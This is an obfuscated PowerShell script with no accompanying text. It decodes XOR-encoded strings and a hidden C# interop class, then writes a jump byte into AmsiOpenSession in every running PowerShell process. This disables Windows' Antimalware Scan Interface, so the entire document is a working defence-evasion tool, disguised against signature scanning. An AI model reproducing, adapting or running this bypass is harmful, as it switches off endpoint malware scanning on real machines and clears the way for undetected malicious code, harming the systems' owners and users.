function Dec($str) {
	$bytes = [System.Convert]::FromBase64String($str);
	$k = ('c','n','s','6','d','g');

	for($i=0; $i -lt $bytes.count ; $i++)
	{
	    $bytes[$i] = $bytes[$i] -bxor [System.Text.Encoding]::UTF8.GetBytes($k[$i%($k.count)])[0];
	}
	
	return [System.Text.Encoding]::UTF8.GetString($bytes);
}

function ModProc($processId)
{

    $patch = [byte]0xEB

    $hHandle = [XOReaper]::OPMask([XOReaper]::PVOP -bor [XOReaper]::PVRE -bor [XOReaper]::PVWR, $false, $processId)
    $dll = [XOReaper]::LLMask(@(Dec "AgMAX0oDDwI="))
    $sess = [XOReaper]::GPAMask($dll, @(Dec "IgMAXysXBgAgUxcUCgEd"))
    $patchAddr = [IntPtr]($sess.ToInt64() + 3)
    $bytesWritten = 0
    $result = [XOReaper]::WPMMask($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
    if ($result)
    {
        Write-Host "[!] Patched"
    }
    else { Write-host "[!] Unsuccessful" }

    [XOReaper]::CHMask($hHandle) | Out-Null
}

function ModAllPShells
{
    $processes = Get-Process
    foreach ($proc in $processes)
    {
        $name = $proc.ProcessName
        if ($name -eq @(Dec("EwEEUxYUCwsfWg==")))
        {
            $processId = $proc.Id
            ModProc $processId
        }
    }
}

$enc = "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"

$def = Dec($enc)

Add-Type -TypeDefinition $def

ModAllPShells
